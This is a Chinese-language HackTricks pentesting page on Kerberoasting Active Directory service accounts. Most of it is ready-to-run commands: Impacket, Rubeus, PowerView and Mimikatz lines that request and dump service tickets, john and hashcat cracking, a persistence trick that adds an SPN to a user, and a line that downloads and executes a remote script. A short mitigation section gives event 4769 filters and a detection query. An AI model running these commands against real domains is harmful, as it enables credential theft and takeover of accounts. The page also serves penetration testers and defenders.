# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持 HackTricks 的方式：

* 如果你想在 HackTricks 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧。

</details>

## Kerberoast

**Kerberoasting** 的目标是收集在 AD 中代表用户账户运行的**服务的 TGS 票据**，而不是计算机账户。因此，这些 TGS **票据的一部分是用从用户密码派生的**密钥**加密的。结果，它们的凭据可以**离线破解**。\
你可以知道一个**用户账户**被用作**服务**，因为属性 **"ServicePrincipalName"** 是**非空的**。

因此，要执行 Kerberoasting，只需要一个可以请求 TGS 的域账户，这是任何人都可以做到的，因为不需要特殊权限。

**你需要在域内有效的凭据。**

### **攻击**

{% hint style="warning" %}
**Kerberoasting 工具** 在执行攻击和发起 TGS-REQ 请求时，通常会请求**`RC4 加密`**。这是因为 **RC4** [**较弱**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)，使用如 Hashcat 这样的工具离线破解比其他加密算法如 AES-128 和 AES-256 更容易。\
RC4 (类型 23) 哈希以 **`$krb5tgs$23$*`** 开头，而 AES-256(类型 18) 以 **`$krb5tgs$18$*`** 开头。`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
多功能工具包括可被Kerberoast攻击的用户信息转储：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **枚举可Kerberoast的用户**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **技术1：请求TGS并从内存中转储**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **技术2：自动化工具**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
当请求TGS时，Windows事件`4769 - 请求了一个Kerberos服务票据`会被生成。
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)来轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### 破解
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 持久性

如果你对一个用户有**足够的权限**，你可以**使其可被Kerberoast攻击**：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
您可以在此处找到用于**kerberoast**攻击的有用**工具**：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

如果您在Linux中遇到此**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(时钟偏差过大)`**，这是因为您的本地时间问题，您需要将主机与DC同步。有几个选项：

* `ntpdate <DC的IP>` - 自Ubuntu 16.04起已弃用
* `rdate -n <DC的IP>`

### 缓解措施

如果可利用，Kerberoast非常隐蔽

* 安全事件ID 4769 – 请求了一个Kerberos票据
* 由于4769非常频繁，让我们过滤结果：
* 服务名称不应为krbtgt
* 服务名称不以$结尾（过滤用于服务的机器账户）
* 账户名称不应为machine@domain（过滤来自机器的请求）
* 失败代码是'0x0'（过滤失败，0x0是成功）
* 最重要的是，票据加密类型是0x17
* 缓解措施：
* 服务账户密码应难以猜测（大于25个字符）
* 使用托管服务账户（定期自动更改密码和委派的SPN管理）
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast 无需域账户

2022年9月，[Charlie Clark](https://exploit.ph/) 发现了一个漏洞，即可以通过 KRB\_AS\_REQ 请求获取服务票据（ST），而无需控制任何 Active Directory 账户。如果一个主体可以在不需要预认证的情况下进行认证（如 AS-REP Roasting 攻击），就可以使用它发起 **KRB\_AS\_REQ** 请求，并通过修改请求体中的 **sname** 属性，欺骗请求以获取 **ST** 而不是 **加密的 TGT**。

该技术在此文章中有详细解释：[Semperis 博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

{% hint style="warning" %}
您必须提供一个用户列表，因为我们没有有效账户来使用这种技术查询 LDAP。
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py 来自 PR #1413](https://github.com/fortra/impacket/pull/1413)：
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus 来自 PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**有关Kerberoasting的更多信息，请参阅ired.team** [**这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**和** [**这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**。**

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**上关注我。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
